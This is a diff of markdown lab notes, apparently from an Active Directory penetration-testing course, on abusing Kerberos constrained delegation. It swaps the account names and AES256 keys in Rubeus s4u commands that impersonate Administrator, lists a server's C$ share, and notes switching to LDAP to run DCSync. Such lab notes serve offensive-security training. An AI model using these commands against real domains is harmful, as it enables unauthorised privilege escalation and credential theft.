@@ -13,12 +13,12 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
 
 Request a `TGT` and `TGS` and impersonate any user
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:STUDVM$ /aes256:777c150c5c1e2e3cef3861807fea59092e9a2d52308f2346cdc0b1d781292169 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /ptt
 ```
 
 Test
 ```powershell
-dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+dir \\mgmtsrv.tech.finance.corp\c$
 ```
 
  
@@ -33,7 +33,7 @@ We can change the protocol/service being accessed for the SPN. This is due to th
 Rubeus and the `/altservice` parameter
 > **Note:** Change to `altservice` to `ldap` to run dcsync
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:http /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:STUDVM$ /aes256:777c150c5c1e2e3cef3861807fea59092e9a2d52308f2346cdc0b1d781292169 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:http /ptt
 ```
 
 Now run a DCSync 
